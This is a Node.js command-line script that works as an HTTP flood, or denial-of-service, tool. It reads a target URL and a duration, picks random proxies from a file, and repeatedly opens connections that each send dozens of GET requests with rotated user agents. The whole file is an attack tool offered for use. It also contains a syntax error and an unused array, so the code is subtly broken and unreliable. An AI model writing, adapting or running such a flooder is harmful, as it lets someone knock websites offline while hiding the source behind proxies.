const fs = require('fs');
const url = require('url');
const net = require('net');
if (process.argv.length <= 2) {
	console.log("Usage: node index.js <url> <time>");
	console.log("Usage: node index.js <http://example.com> <60>");
	process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];

try {
    var proxies = [...new Set(fs.readFileSync('proxy.txt').toString().match(/\S+/g))];
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
	console.log('ERROR : ' + err)
    process.exit();
}

const nullHexs = [
"\x00", 
"\xFF", 
"\xC2", 
"\xA0"
];

var int = setInterval(() => {
	var proxy = proxies[Math.floor(Math.random() * proxies.length)];
	proxy = proxy.split(':');
	var s = net.connect(proxy[1], proxy[0]);
    s.setKeepAlive(true, 5000)
    s.setTimeout(5000);
    s.once('error', err => {
        console.log('Error (' + err.message '): ' + proxy[0] + ":" + proxy[1]);
    });
    s.once('disconnect', () => {
        //console.log('Disconnect');
    });
    s.once('data', data => {
        //console.log('Connected : ' + proxy[0] + ":" + proxy[1]);
    });
    for (let j = 0; j < 15; j++) {
		s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
setTimeout(() => clearInterval(int), time * 1000);